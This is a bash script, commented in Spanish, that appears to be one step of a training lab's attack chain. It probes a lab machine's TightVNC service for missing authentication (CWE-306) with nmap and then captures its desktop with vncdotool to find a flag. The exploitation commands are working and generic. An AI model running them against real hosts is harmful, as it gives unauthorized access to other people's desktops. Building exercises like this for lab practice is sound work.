#!/usr/bin/env bash
# ============================================================================
#  lab/chain/05-m4-to-m5.sh — salto 5: M6 → M5 (VNC); no requiere M4
# ----------------------------------------------------------------------------
#  Vulnerabilidad: TightVNC 2.8.90 con autenticación VNC desactivada
#  (CWE-306). Se accede al escritorio sin credenciales.
#
#  Comprobación sin GUI: nmap --script vnc-info debe responder
#  "Authentication: None". Con --run se intenta una captura con vncdotool.
#
#  Uso:
#    bash lab/chain/05-m4-to-m5.sh            # imprime y verifica
#    bash lab/chain/05-m4-to-m5.sh --run      # captura de pantalla
# ============================================================================

set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_LOG
. "$HERE/../common/lib.sh"
LAB_ROLE=chain

RUN=0
WORK="${LAB_WORK:-${HOME:-/tmp}/lab-work}"

while (($#)); do
  case "$1" in
    --run) RUN=1; shift ;;
    -h|--help) echo "Uso: $0 [--run]"; exit 0 ;;
    *) die "opción desconocida: $1" ;;
  esac
done

lab_banner
step "salto 5 · M5 (${M5}) · VNC sin autenticación (no requiere M4)"
cat <<EOF
Vulnerabilidad: VNC sin autenticación (TightVNC 2.8.90, CWE-306).

  nmap -Pn -p5900 --script vnc-info $M5
  # esperado: Authentication: None
  vncviewer $M5

  # prueba no interactiva (si vncdotool está instalado):
  vncdotool -s $M5 capture /tmp/m5-flag.png
EOF

step "verificación (nmap vnc-info)"
if command -v nmap >/dev/null 2>&1; then
  out="$(nmap -Pn -p5900 --script vnc-info "$M5" 2>/dev/null || true)"
  printf '%s\n' "$out"
  if grep -qi 'Authentication: *None' <<<"$out"; then
    ok "VNC sin autenticación en M5"
  else
    warn "no confirmado: revisar que TightVNC esté instalado y el 5900 abierto"
  fi
else
  warn "sin nmap; se omite la verificación"
fi

if (( RUN == 0 )); then
  step "modo ejecución"
  printf '  Sin --run no se abre nada. Para capturar: --run (requiere vncdotool)\n' >&2
  exit 0
fi

mkdir -p "$WORK"
if command -v vncdotool >/dev/null 2>&1; then
  step "captura de pantalla del escritorio de M5"
  vncdotool -s "$M5" capture "$WORK/m5-flag.png" \
    && ok "captura: $WORK/m5-flag.png (revisar flag-M5.txt en el escritorio)" \
    || warn "vncdotool no pudo conectar (¿servicio tvnserver arriba?)"
else
  warn "falta vncdotool (pip install vncdotool); usando vncviewer interactivo"
  command -v vncviewer >/dev/null 2>&1 || die "falta vncviewer (apt install tigervnc-viewer)"
  warn "abriendo vncviewer contra $M5 (sin contraseña)"
  vncviewer "$M5" &
fi
